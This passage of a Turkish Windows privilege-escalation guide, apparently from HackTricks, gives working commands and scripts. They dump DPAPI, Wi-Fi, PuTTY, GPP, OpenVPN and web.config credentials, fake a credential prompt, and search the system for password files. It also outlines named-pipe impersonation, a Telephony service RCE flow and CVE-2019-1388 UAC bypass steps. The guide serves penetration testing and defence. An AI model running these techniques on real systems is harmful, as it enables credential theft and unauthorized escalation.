DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde depolanır. **Kullanıcının özel anahtarlarını koruyan master key ile aynı dosyada birlikte bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemeyeceğini, ancak PowerShell üzerinden listelenebileceğini unutmayın.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Uygun argümanlarla (`/pvk` veya `/rpc`) şifresini çözmek için **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**master password tarafından korunan credentials files** genellikle şu konumda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanarak şifre çözme işlemi yapabilirsiniz.\
`sekurlsa::dpapi` module ile **memory** üzerinden birçok DPAPI **masterkey** çıkarabilirsiniz (root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, şifrelenmiş kimlik bilgilerini pratik bir şekilde depolamak için genellikle **scripting** ve otomasyon görevlerinde kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu genellikle yalnızca oluşturuldukları bilgisayarda aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Bir PS kimlik bilgisinin bulunduğu dosyadan şifresini çözmek için şunu çalıştırabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` konumlarında bulabilirsiniz.

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` module'ünü kullanarak **herhangi bir .rdg dosyasının şifresini çözebilirsiniz**\
**Mimikatz** `sekurlsa::dpapi` module'ü ile bellekten **çok sayıda DPAPI masterkey'i çıkarabilirsiniz**

### Sticky Notes

Kullanıcılar, bunun bir veritabanı dosyası olduğunu fark etmeden, Windows iş istasyonlarında **parolaları** ve diğer bilgileri **kaydetmek** için sıklıkla Sticky Notes uygulamasını kullanır. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve aranıp incelenmeye her zaman değerdir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity level altında çalışmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **credentials** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)'tan alınmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır** ve birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Registry'de SSH anahtarları

SSH private keys, `HKCU\Software\OpenSSH\Agent\Keys` registry key'inin içinde saklanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH key'dir. Şifrelenmiş olarak depolanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi için: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız şunu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve ssh üzerinden bir makineye giriş yapmaya çalıştım. HKCU\Software\OpenSSH\Agent\Keys registry anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM ve SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın

### Önbelleğe Alınmış GPP Pasword

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir grup makinede özel local administrator hesaplarının dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin ciddi güvenlik açıkları vardı. İlk olarak, SYSVOL içinde XML dosyaları olarak depolanan Group Policy Objects (GPOs), herhangi bir domain user tarafından erişilebilir durumdaydı. İkinci olarak, publicly documented default key kullanılarak AES256 ile şifrelenen bu GPP'lerdeki password'ler, herhangi bir authenticated user tarafından çözülebiliyordu. Bu durum, user'ların elevated privileges elde etmesine olanak tanıyabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak amacıyla, boş olmayan bir `"cpassword"` alanı içeren locally cached GPP dosyalarını tarayan bir function geliştirildi. Böyle bir dosya bulunduğunda function, password'ü decrypt eder ve özel bir PowerShell object döndürür. Bu object, GPP ve dosyanın konumu hakkında ayrıntılar içererek bu security vulnerability'nin belirlenmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista'dan önce)_ içinde arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ü decrypt etmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Parolaları elde etmek için crackmapexec kullanma:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Credentials içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Loglar
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini iste

Kullanıcının bunları bilebileceğini düşünüyorsanız, kullanıcıdan her zaman **kendi kimlik bilgilerini veya farklı bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** istemenin gerçekten **riskli** olduğunu unutmayın):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgilerini içeren olası dosya adları**

Bir süre önce **parolaları** **açık metin** veya **Base64** biçiminde içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Önerilen tüm dosyalarda ara:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Geri Dönüşüm Kutusu'ndaki Kimlik Bilgileri

Kimlik bilgilerini bulmak için Geri Dönüşüm Kutusu'nu da kontrol etmelisiniz.

Çeşitli programlar tarafından kaydedilen **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer olası kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Kayıt defterinden openssh anahtarlarını çıkarma.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının depolandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini de kontrol edin; bazı **parolalar** burada depolanıyor olabilir.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **iletişime** olanak sağlayan, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir sınıf kimliği (**CLSID**) ile **tanımlanır** ve her bileşen, arabirim kimlikleri (IID'ler) ile tanımlanan bir veya daha fazla arabirim aracılığıyla işlevsellik sunar.

COM sınıfları ve arabirimleri sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında kayıt defterinde tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek **HKEY\CLASSES\ROOT** oluşturulur.

Bu kayıt defterinin CLSID'leri içinde, bir **DLL**'yi gösteren bir **varsayılan değer** ile **ThreadingModel** adlı bir değer içeren alt kayıt defteri **InProcServer32** bulunabilir. **ThreadingModel** değeri **Apartment** (Tek iş parçacıklı), **Free** (Çok iş parçacıklı), **Both** (Tek veya çok iş parçacıklı) ya da **Neutral** (İş parçacığından bağımsız) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterinin CLSID'leri içinde, bir DLL'yi gösteren bir varsayılan değer ile bir değer içeren InProcServer32 alt kayıt defterini bulabilirsiniz...](<../../images/image (729).png>)

Temel olarak, yürütülecek **DLL'lerden** herhangi birinin üzerine yazabiliyorsanız ve bu DLL farklı bir kullanıcı tarafından yürütülecekse, **yetkilerinizi yükseltebilirsiniz**.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için bkz.:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola arama**

**Dosya içeriklerinde arama yapın**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip bir dosya ara**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adlarını ve parolaları arayın**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parolaları arayan Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir; bu plugin'i, victim içinde credential arayan her metasploit POST module'ünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika tool'dur.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) tool'u, bu verileri clear text olarak kaydeden çeşitli tool'lara ait **session**'ları, **username**'leri ve **password**'leri arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM olarak çalışan bir process'in full access ile yeni bir process açtığını** (`OpenProcess()`) düşünün. Aynı process, **ana process'in tüm açık handle'larını devralan, ancak düşük privileges ile çalışan yeni bir process de oluşturuyor** (`CreateProcess()`).\
Ardından, **düşük privileges'lı process'e full access'iniz varsa**, `OpenProcess()` ile oluşturulan privileged process'e ait **açık handle'ı alabilir** ve **bir shellcode inject edebilirsiniz**.\
**Bu vulnerability'nin nasıl tespit edilip exploit edileceği** hakkında daha fazla bilgi için [bu örneği okuyun.](leaked-handle-exploitation.md)\
Farklı permission seviyeleriyle (yalnızca full access değil) devralınan process ve thread'lerin daha fazla açık handle'ını nasıl test edip abuse edebileceğinize dair daha kapsamlı bir açıklama için [**bu diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan shared memory segment'leri, process communication ve data transfer'i mümkün kılar.

Windows, ilgisiz process'lerin farklı network'ler üzerinden bile data paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sağlar. Bu yapı, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı client/server architecture'a benzer.

Bir **client** bir pipe üzerinden data gönderdiğinde, pipe'ı oluşturan **server**, gerekli **SeImpersonate** rights'larına sahipse **client'ın identity'sini üstlenebilir**. Taklit edebileceğiniz bir pipe üzerinden communication gerçekleştiren **privileged process**'i tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde bu process'in identity'sini benimseyerek **daha yüksek privileges elde etme** fırsatı sunar. Böyle bir attack'ın nasıl gerçekleştirileceğine dair yardımcı kılavuzları [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulabilirsiniz.

Ayrıca aşağıdaki tool, **burp gibi bir tool ile named pipe communication'ı intercept etmenizi** sağlar: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu tool, privesc'leri bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv), server mode'da `\\pipe\\tapsrv`'yi (MS-TRP) expose eder. Remote authenticated client, mailslot-based async event path'i abuse ederek `ClientAttach`'i mevcut ve `NETWORK SERVICE` tarafından writable olan herhangi bir file'a arbitrary **4-byte write** gerçekleştirecek şekilde kullanabilir; ardından Telephony admin rights'larını elde edip service olarak arbitrary bir DLL load edebilir. Tam flow:

- `pszDomainUser`, writable olan mevcut bir path'e ayarlanmış şekilde `ClientAttach` → service, bu path'i `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event write'ları için kullanır.
- Her event, `Initialize` içindeki attacker-controlled `InitContext`'i bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app register edin, `TRequestMakeCall`'ı (`Req_Func 121`) trigger edin, `GetAsyncEvents` (`Req_Func 0`) ile fetch edin, ardından deterministic write'ları tekrarlamak için unregister/shutdown gerçekleştirin.
- `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna kendinizi ekleyin, reconnect gerçekleştirin, ardından `GetUIDllName`'i arbitrary bir DLL path ile çağırarak `TSPI_providerUIIdentify`'ı `NETWORK SERVICE` olarak execute edin.

Daha fazla detay:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows'ta bir şeyler execute edebilen File Extensions

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderers üzerinden Protocol handler / ShellExecute abuse

`ShellExecuteExW`'ye forward edilen clickable Markdown link'leri tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya register edilmiş herhangi bir scheme) trigger edebilir ve attacker-controlled file'ları mevcut user olarak execute edebilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Password'ler için Command Line'ları Monitoring Etme**

Bir user olarak shell aldığınızda, **credentials'ları command line üzerinde geçiren** scheduled task'ler veya execute edilen diğer process'ler olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını capture eder ve mevcut state'i önceki state ile karşılaştırarak farklılıkları output eder.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Processlerden parola çalma

## Düşük Yetkili Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafiksel arayüze (konsol veya RDP aracılığıyla) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan "NT\AUTHORITY SYSTEM" olarak bir terminal veya başka herhangi bir process çalıştırmak mümkündür.

Bu, aynı vulnerability ile aynı anda privilege escalation gerçekleştirmeyi ve UAC'yi bypass etmeyi mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan binary Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu zafiyeti exploit etmek için aşağıdaki adımların gerçekleştirilmesi gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium'dan High Integrity Level / UAC Bypass'e

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'leri** hakkında bilgi edinmek için şunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename'den SYSTEM EoP'ye

[**Bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanan teknik ve [**burada bulunan**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) exploit code.

Saldırı, Windows Installer'ın rollback özelliğinin kötüye kullanılarak kaldırma işlemi sırasında meşru dosyaların malicious dosyalarla değiştirilmesine dayanır. Bunun için attacker'ın, `C:\Config.Msi` klasörünü hijack etmek amacıyla kullanılacak **malicious bir MSI installer** oluşturması gerekir. Bu klasör daha sonra Windows Installer tarafından diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için kullanılır; rollback dosyaları ise malicious payload içerecek şekilde değiştirilmiş olur.

Özetlenen teknik şu şekildedir:

